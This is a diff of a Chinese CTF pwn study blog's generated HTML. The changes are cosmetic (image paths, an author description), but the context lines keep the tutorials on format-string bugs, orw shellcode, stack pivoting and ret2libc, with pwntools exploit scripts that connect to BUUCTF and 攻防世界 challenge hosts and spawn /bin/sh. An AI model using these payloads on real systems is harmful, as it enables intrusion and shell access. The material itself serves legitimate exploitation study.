&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;come here&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -587,7 +687,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -667,8 +767,8 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>          <span class="comment">#hex(4669) = 0x123d --&gt;read地址的后两字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                <span class="comment">#泄露libc_start_main+地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment">#p64(stack_addr - 8)----&gt;printf的返回地址</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png" alt="1"></p>
-<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png" alt="1"></p>
+<p><img src="/./%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png" alt="1"></p>
+<p><img src="/./%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png" alt="1"></p>
 <p>可以看到0x7fffffffdd08 &#x3D; 0x7fffffffdd10 - 0x08从而定位printf_ret的地址。</p>
 <p>然后我们可以看到libc_start_main+122的地址在栈上的位置；</p>
 <p>0x7fffffffdd78 - 0x7fffffffdd10 &#x3D; 104，104&#x2F;8  &#x3D; 13，此时我们用%19$p就可以泄露出libc_start_main+122的地址，再减去122就可以得到</p>
@@ -763,7 +863,7 @@
 <p>mov rsp rbp;</p>
 <p>pop rbp;</p>
 <p>pop rip;</p>
-<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/speak.png" alt="1"></p>
+<p><img src="/./%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/speak.png" alt="1"></p>
 <p>现在开始格式化字符串漏洞的知识点的总结。</p>
 <p>什么是格式化字符串？</p>
 <ul>
@@ -821,7 +921,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -913,7 +1013,7 @@
 <p>安装：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf  #elf换成你自己的文件名</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
 <p>可以看到那些函数是可以用的。</p>
 <h3 id="open、read、write函数的了解"><a href="#open、read、write函数的了解" class="headerlink" title="open、read、write函数的了解"></a>open、read、write函数的了解</h3><p>open()函数：</p>
 <p>函数原型</p>
@@ -1090,7 +1190,7 @@
 </tr>
 </tbody></table>
 <h4 id="做完了铺垫，现在就开始orw"><a href="#做完了铺垫，现在就开始orw" class="headerlink" title="做完了铺垫，现在就开始orw"></a>做完了铺垫，现在就开始orw</h4><h5 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h5><p>首先,看看最简单的orw,在没有开启NX的条件下，可以直接写入这三个函数执行。</p>
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
 <p>第一种直接用汇编写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#0x67616c66根据文件名改动 0x67616c66转ASCII--&gt;flag</span><br><span class="line">shellcode=asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br></pre></td></tr></table></figure>
 
@@ -1109,7 +1209,7 @@
 
 
 
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -1202,7 +1302,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1279,7 +1379,7 @@
 <h3 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol>
 <li>首先先了解栈的结构</li>
 </ol>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="1"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="1"></p>
 <p>(自己画的，有错误望指正)</p>
 <ol start="2">
 <li>了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令</li>
@@ -1300,37 +1400,37 @@
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave //mov esp;ebp 把ebp传给esp,此时esp和ebp就在同一个位置了，他们指向同一个内容</span><br><span class="line">      //pop ebp 把栈顶的内容弹给ebp。此时ebp指向的就是栈顶的内容了</span><br><span class="line">由于esp时刻指向的是栈顶的位置，栈顶的内容弹出后，esp会下降一个单位</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png" alt="2"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png" alt="2"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret  //pop eip 就是把esp指向地址弹如eip,同时esp下降一个单元</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png" alt="3"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png" alt="3"></p>
 <p>了解了栈的结构和leave;ret的执行过程后，就可以来了解栈迁移的原理了</p>
 <ol start="5">
 <li><p>栈迁移的原理：栈迁移一共要执行两次leave;ret</p>
 <p>1.首先我们先了解一下此时栈上的分布情况</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主要如下图，这里注释：</span><br><span class="line">0xffff100c---&gt;system的返回地址</span><br><span class="line">0xffff1010---&gt;system参数的存储地址</span><br><span class="line">0xffff1014---&gt;存储/bin</span><br><span class="line">0xffff1018---&gt;存储/sh</span><br><span class="line">0xffff1020---&gt;0xffff1004  也就是ebp---&gt;0xffff1004</span><br><span class="line">0xffff1024---&gt;leave ret;  原本是return address;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png" alt="4"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png" alt="4"></p>
 <p>2.第一次leave;ret:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由上面的leave;ret的执行过程，首先leave：mov ebp;esp,让ebp和esp在同一个位置；leave: pop ebp,此时我们把ebp所指的内容换成</span><br><span class="line">了需要迁移到的位置，所以pop ebp后esp指向的就是需要迁移到的位置。然后我们把return address换成leave ret的地址，就会再次执</span><br><span class="line">行leave ret。</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png" alt="5"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png" alt="5"></p>
 <p>3.第二次leave;ret:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同样是leave:mov ebp;esp,让ebp和esp在同一个位置；但是此时ebp指向的是需要迁移到的位置，所以esp此时指向的也是需要迁移到的位</span><br><span class="line">置;leave：pop ebp,我们把return address的地址换成system的地址,就使得esp下降一个单元后正好指向system的地址。ret:pop </span><br><span class="line">eip,最终eip指向system的地址---&gt;getshell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png" alt="5"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png" alt="5"></p>
 </li>
 </ol>
 <p>了解完了32位的栈溢出，现在来了解64位栈溢出</p>
 <h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位和32位栈的结构是相似的，主要不同就是调用函数时传参的不同</p>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png" alt="5"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png" alt="5"></p>
 <h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2">buuctf-ciscn_2019_es_2</a></p>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png" alt="6"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png" alt="6"></p>
 <ol>
 <li>IDA反编译</li>
 </ol>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png" alt="6"></p>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png" alt="6"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png" alt="6"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png" alt="6"></p>
 <p>计算一下溢出的长度0x30 - 0x28 &#x3D; 8;很明显长度不够，要用到栈迁移。</p>
 <ol start="2">
 <li>先给出exp，在具体解释</li>
@@ -1343,13 +1443,13 @@
 <p>(1)用ROPgadget</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_es_2 --only &quot;leave|ret&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png" alt="8"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png" alt="8"></p>
 <p>(2)在IDA的汇编代码里面找</p>
-<p>​       <img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png" alt="8"></p>
+<p>​       <img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png" alt="8"></p>
 <ol start="4">
 <li>找到system的plt地址</li>
 </ol>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png" alt="8"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png" alt="8"></p>
 <ol start="5">
 <li><p>在vul函数中有两个溢出点，所以我们就需要先通过第一个溢出泄露出ebp的地址，再构造栈迁移的payload</p>
 <p>(1)首先泄露ebp的地址</p>
@@ -1361,16 +1461,16 @@
 <p>buf&#x3D;ebp-0x38 通过调试可以得到，我们最后调试，先解释payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf)+p32(leave)</span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line">buf + 12:p32(sys_addr)=4,b&#x27;aaaa&#x27;=4,p32(buf+12)=4,4+4+4=12所以buf+12就是/bin/sh的起始地址</span><br><span class="line">p32(buf)：栈迁移所到达的位置</span><br><span class="line">leave:leave ret;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png" alt="8"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png" alt="8"></p>
 </li>
 </ol>
 <p>​       0xfffd158 - 0xfffd130 &#x3D; 0x28   0xfffd158回弹到0xfffd168，正好0x28 + 0x10 &#x3D; 0x38;</p>
 <h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_babystack">actf_2019_babystack</a></p>
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png" alt="9"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png" alt="9"></p>
 <p> 64位，只开了NX,先给出exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#io =process(&#x27;./ACTF_2019_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26651</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008F6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line">pop_rsi__r15_ret =<span class="number">0x400ad1</span></span><br><span class="line">leave_ret = <span class="number">0x400A18</span></span><br><span class="line">offest = <span class="number">0xd0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">system_addr = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png" alt="9"></p>
+<p><img src="/./%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png" alt="9"></p>
 <p>这个很明显要栈迁移了</p>
 <p>这个附件里面没有找到system的地址，所以我们只能通过泄露libc来打了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr) #ret2libc的payload</span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;) #填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #stack_addr就是栈的起始位置，也就是我要迁移到的位置，本题直接回打印出来，接受就可以了</span><br><span class="line">b&#x27;a&#x27;*8是因为pop rbp的时候 rsp会+8，所以要。</span><br></pre></td></tr></table></figure>
@@ -1481,7 +1581,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1562,7 +1662,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1667,7 +1767,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -1727,94 +1827,6 @@
           <p>这里主要记一下seed的覆盖，srand(seed);v2 &#x3D; rand() % 6 + 1;其中rand的生成是依靠seed的，我们只要找到seed与输入值之间的偏移将seed修改为我们想要的值，就可以预测rand的生成</p>
 <p>这是攻防世界dice_game的exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="string">&#x27;57464&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0</span>)  <span class="comment">#buf与seed的偏移是0x40</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">	a.append(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.recv()</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">
-
